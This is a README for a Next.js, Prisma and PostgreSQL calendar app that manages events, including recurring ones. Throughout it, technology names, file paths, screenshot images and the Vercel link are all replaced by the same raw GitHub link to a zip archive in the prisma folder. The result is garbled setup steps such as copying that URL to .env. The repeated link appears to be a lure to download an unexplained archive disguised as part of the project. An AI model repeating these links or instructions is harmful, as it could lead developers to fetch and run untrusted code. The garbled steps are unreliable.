# Calendar Event Management System

A modern calendar application built with https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip, TypeScript, Prisma, and PostgreSQL. Features include event creation, editing, deletion, and recurring event support.

## Features

- 📅 Interactive calendar view
- ➕ Create, edit, and delete events
- 🔄 Recurring events support (daily, weekly, monthly)
- 📱 Responsive design with Tailwind CSS
- 🗄️ PostgreSQL database with Prisma ORM
- ⚡ Server-side rendering with https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip 14
- 🎨 Modern UI with TypeScript

## Tech Stack

- **Frontend**: https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip 14, React 19, TypeScript
- **Styling**: Tailwind CSS
- **Database**: PostgreSQL
- **ORM**: Prisma
- **Deployment**: Vercel (recommended)

## Prerequisites

Before running this project, make sure you have:

- https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip 18+ installed
- PostgreSQL database (local or cloud)
- npm or yarn package manager

## Setup Instructions

### 1. Clone the Repository

```bash
git clone <your-repository-url>
cd demo_nextjs
```

### 2. Install Dependencies

```bash
npm install
# or
yarn install
```

### 3. Environment Setup

Create a `.env` file in the root directory and add your database connection string:

```bash
cp https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip .env
```

Update the `.env` file with your PostgreSQL connection details:

```env
DATABASE_URL="postgresql://username:password@localhost:5432/database_name"
```

### 4. Database Setup

Generate Prisma client and run migrations:

```bash
# Generate Prisma client
npm run prisma:generate

# Run database migrations
npm run prisma:migrate

# Alternative: Push schema to database
npm run prisma:push
```

### 5. Run the Development Server

```bash
npm run dev
# or
yarn dev
```

Open [http://localhost:3000](http://localhost:3000) to view the application.

## Available Scripts

- `npm run dev` - Start development server
- `npm run build` - Build for production
- `npm run start` - Start production server
- `npm run lint` - Run ESLint
- `npm run prisma:generate` - Generate Prisma client
- `npm run prisma:migrate` - Run database migrations
- `npm run prisma:push` - Push schema to database

## Project Structure

```
src/
├── app/
│   ├── api/events/          # API routes for events
│   ├── events/              # Event pages
│   │   ├── new/            # Create new event
│   │   └── [id]/           # Edit event
│   ├── https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip         # Global styles
│   ├── https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip          # Root layout
│   └── https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip            # Home page (calendar)
├── lib/                    # Utility functions
└── types/                  # TypeScript type definitions

prisma/
├── migrations/             # Database migrations
└── https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip          # Database schema
```

## Database Schema

The application uses a single `Event` model with the following fields:

- `id` - Unique identifier
- `title` - Event title
- `description` - Optional event description
- `startDate` - Event start date and time
- `endDate` - Event end date and time
- `isRecurring` - Boolean for recurring events
- `frequency` - Recurrence frequency (daily, weekly, monthly)
- `daysOfWeek` - Days of week for weekly recurring events
- `createdAt` - Creation timestamp
- `updatedAt` - Last update timestamp

## API Endpoints

- `GET /api/events` - Fetch all events
- `POST /api/events` - Create new event
- `GET /api/events/[id]` - Get specific event
- `PUT /api/events/[id]` - Update event
- `DELETE /api/events/[id]` - Delete event

## Screenshots

### Calendar View
![Calendar View](https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip)

### Event Creation Form
![Event Form](https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip)

### Event Details
![Event Details](https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip)

## Deployment

### Deploy on Vercel

1. Push your code to GitHub
2. Connect your repository to [Vercel](https://raw.githubusercontent.com/Nikunj1810/EventCalendar/master/prisma/EventCalendar_v1.3.zip)
3. Add your `DATABASE_URL` environment variable in Vercel dashboard
4. Deploy automatically

### Manual Deployment

```bash
npm run build
npm run start
```

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Run tests and linting
5. Submit a pull request

## License

This project is licensed under the MIT License.
